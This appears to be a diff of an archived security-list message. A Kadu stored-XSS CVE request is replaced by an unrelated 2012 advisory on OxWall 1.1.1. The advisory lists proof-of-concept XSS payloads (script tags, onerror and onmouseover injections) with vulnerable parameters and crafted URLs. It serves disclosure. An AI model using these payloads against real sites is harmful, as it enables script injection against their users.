@@ -1,62 +1,102 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/02/27/3
-Message-ID: <4F4B5585.5060105@redhat.com>
-Date: Mon, 27 Feb 2012 11:05:57 +0100
-From: Jan Lieskovsky <jlieskov@...hat.com>
-To: "Steven M. Christey" <coley@...us.mitre.org>, Mariusz Fik <fisiu@...nsuse.org>, Rafał Malinowski <rafal.przemyslaw.malinowski@...il.com>
-CC: oss-security@...ts.openwall.com, Radoslaw Lisowski <radoslaw.lisowski@...il.com>
-Subject: CVE Status Clarification / Request -- kadu: Stored XSS by parsing contact's status and sms messages in history
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/02/20/5
+Message-ID: <CAPYM6VxnCebiiTDCJ1=iLEY4_EFnNEzeCXjz8Xy0TRtx07ZCmg@mail.gmail.com>
+Date: Tue, 21 Feb 2012 00:53:46 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
+To: full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>,  secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com,  moderators@...db.org, submissions@...ketstormsecurity.org,  submit@...ecurity.com, submit@...3ct0r.com, oss-security@...ts.openwall.com
+Subject: OxWall 1.1.1 <= Multiple Cross Site Scripting Vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-Hello Mariusz, Kurt, Steve, vendors,
+1. OVERVIEW
 
-   [1] though https://bugzilla.novell.com/show_bug.cgi?id=749036#c0
-   mentions CVE identifier has been already requested for this:
+OxWall 1.1.1 and lower versions are vulnerable to Cross Site Scripting.
 
-   "The bug still doesn't have CVE number but will have in near future."
 
-   it doesn't look like CVE id has been requested for this via OSS
-   security list, so moving this discussion / CVE request there.
+2. BACKGROUND
 
-   Mariusz, could you clarify, if this issue has got a CVE identifier
-   already or if we still need one? If aren't able to do so, whom
-   should we contact to be clear about "CVE request status" for this?
+Oxwall is a free open source software package for building social
+networks, family sites and collaboration systems. It is a flexible
+community website engine developed with the aim to provide people with
+a well-coded, user-friendly software platform for social needs. It is
+easy to set up, configure and manage Oxwall while you focus on your
+site idea. We are testing the concept of free open source community
+software for complete (site,sub-site setups) and partial
+(widgets,features) community and collaboration solutions for companies
+and individuals.
 
-   Or at least clarify which list that "Here is a part of massage sent
-   by developers to package maintainers:" has been sent to? (so
-   we could ask there)
 
-   And in the end either use that one, already allocated or allocate
-   a new one here via OSS.
+3. VULNERABILITY DESCRIPTION
 
-   Below being issue description as I got it based on / from [2]:
+Multiple parameters were not properly sanitized, which allows attacker
+to conduct Cross Site Scripting attack. This may allow an attacker to
+create a specially crafted URL that would execute arbitrary script
+code in a victim's browser.
 
-   A stored cross-site scripting (XSS) flaw was found in the way Kadu, the instant
-messenger compatible with the Gadu-Gadu protocol, performed sanitization of
-status and sms messages for particular contact in user's history. A remote
-attacker could provide a specially-crafted status or sms message, which would
-be stored in victim's Kadu history file, if the attacker was present on the
-contact list of the victim and the victim has had storage of statuses enabled
-for their history file. When the victim later examined the content of the
-status history, this flaw could lead to arbitrary HTML or webscript execution.
 
-References:
-[2] https://bugzilla.novell.com/show_bug.cgi?id=749036
-[3] https://bugzilla.redhat.com/show_bug.cgi?id=797777
+4. VERSIONS AFFECTED
 
-Upstream patches:
-[4] https://gitorious.org/kadu/kadu/commit/ebe3674cf0f3aa9b36308c06e19cb293cc790b52
-     (patch for the XSS issue)
+1.1.1 and lower
 
-[5] https://gitorious.org/kadu/kadu/commit/e9506be6d3dcdd408fdf83d8eb82416c9b798c84
-     (additional hardening)
 
-[6] https://gitorious.org/kadu/kadu/commit/91772e46541e22cbc2c7bf41a1a9798c2a58f6d6
-     (disable xhtmlrequests)
+5. PROOF-OF-CONCEPT/EXPLOIT
 
-[7] https://gitorious.org/kadu/kadu/commit/94e7479617d78a1649a0763960edade7ad09a0d0
-    (allow only GET and HEADER requests, additional hardening)
+URL: http://localhost/Oxwall/join
 
-Thank you && Regards, Jan.
---
-Jan iankko Lieskovsky / Red Hat Security Response Team
+Injected Attack String: '"><script>alert(/XSS/)</script>
+Method: HTTP POST
+Vulnerable Parameters: captchaField, email, form_name  ,password
+,realname  ,repeatPassword ,username
+
+------------------------------------------------------------------------------------
+
+URL: http://localhost/Oxwall/contact
+
+Injected Attack String: '"><script>alert(/XSS/)</script>
+Method: HTTP POST
+Vulnerable Parameters: captcha, email, form_name  ,from , subject
+------------------------------------------------------------------------------------
+
+URL: http://localhost/Oxwall/blogs/browse-by-tag?tag=%27%22%3E%3Cscript%3Ealert%28/XSS/%29%3C/script%3E
+Vulnerable Parameter: tag
+
+----------------------------------------------------------------------------
+
+Vulnerable Parameter: RAW-URI
+
+http://localhost/Oxwall/photo/viewlist/tagged/><img src=xs onerror=alert('XSS')>
+
+http://localhost/Oxwall/photo/viewlist/%22style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22onmouseover=alert%28%27XSS%27%29;%22x=
+
+http://localhost/Oxwall/video/viewlist/%22style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22onmouseover=alert%28%27XSS%27%29;%22x=
+
+
+6. SOLUTION
+
+Upgade to the latest version of Oxwall.
+
+
+7. VENDOR
+
+Oxwall Foundation
+http://www.oxwall.org/
+
+
+8. CREDIT
+
+Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2011-06-09: notified vendor
+2012-02-20: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/%5BOxWall_1.1.1%5D_xss
+Oxwall Home Page: http://www.oxwall.org/
+
+
+#yehg [2012-02-20]
